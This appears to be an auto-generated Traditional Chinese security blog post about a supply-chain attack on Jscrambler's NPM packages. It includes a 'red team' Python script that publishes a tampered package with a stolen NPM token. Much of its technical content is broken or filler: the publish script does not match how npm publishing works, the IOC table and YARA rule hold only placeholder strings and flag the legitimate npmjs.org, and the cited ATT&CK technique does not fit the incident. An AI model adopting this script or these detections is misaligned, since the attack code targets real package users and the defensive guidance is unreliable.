---
layout: post
title:  "針對NPM套件供應鏈攻擊事故，Jscrambler開發團隊公布調查結果"
date:   2026-07-18 07:39:01 +0000
categories: [security]
severity: high
---

# 🔥 解析 Jscrambler NPM 套件入侵事件：從 GitHub Actions 到 NPM 權杖洩露
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: Unauthorized Access to NPM Packages
> * **關鍵技術**: `GitHub Actions`, `NPM Tokens`, `Supply Chain Attack`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者取得了 Jscrambler 開發團隊的 GitHub SSH 金鑰和 NPM 發布憑證，進而獲得了寫入 NPM 套件的權限。
* **攻擊流程圖解**:
  1. 攻擊者入侵 Jscrambler 開發團隊的一臺電腦。
  2. 攻擊者取得 GitHub SSH 金鑰和 NPM 發布憑證。
  3. 攻擊者使用 GitHub Actions 工作流程洩露 NPM 權杖。
  4. 攻擊者使用洩露的 NPM 權杖發布竄改後的套件版本。
* **受影響元件**: Jscrambler NPM 套件，版本號未指定。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要取得 Jscrambler 開發團隊的 GitHub SSH 金鑰和 NPM 發布憑證。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    #洩露 NPM 權杖
    npm_token = " attacker_obtained_npm_token"
    
    #發布竄改後的套件版本
    package_name = "jscrambler-package"
    package_version = "1.0.0"
    
    #構建發布請求
    url = f"https://registry.npmjs.org/{package_name}/{package_version}"
    headers = {
        "Authorization": f"Bearer {npm_token}",
        "Content-Type": "application/json"
    }
    data = {
        "name": package_name,
        "version": package_version,
        "description": "Malicious package"
    }
    
    response = requests.put(url, headers=headers, json=data)
    
    if response.status_code == 200:
        print("Malicious package published successfully")
    else:
        print("Failed to publish malicious package")
    
    ```
* **繞過技術**: 攻擊者可以使用 GitHub Actions 工作流程洩露 NPM 權杖，繞過 Jscrambler 開發團隊的安全措施。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| ` attacker_obtained_npm_token` | ` attacker_ip` | `npmjs.org` | `/jscrambler-package` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_npm_package {
      meta:
        description = "Detects malicious NPM packages"
      strings:
        $npm_token = " attacker_obtained_npm_token"
      condition:
        $npm_token
    }
    
    ```
* **緩解措施**: Jscrambler 開發團隊應該撤銷洩露的 NPM 權杖，更新 GitHub SSH 金鑰和 NPM 發布憑證，並實施額外的安全措施，例如使用二步 驗證和密碼管理工具。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **GitHub Actions**: 一種持續整合和持續部署 (CI/CD) 工具，允許開發人員自動化軟件開發工作流程。
* **NPM Tokens**: 用於授權 NPM 套件發布的權杖。
* **Supply Chain Attack**: 一種攻擊類型，攻擊者瞄準軟件供應鏈中的弱點，例如第三方庫或開發工具。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/177420)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


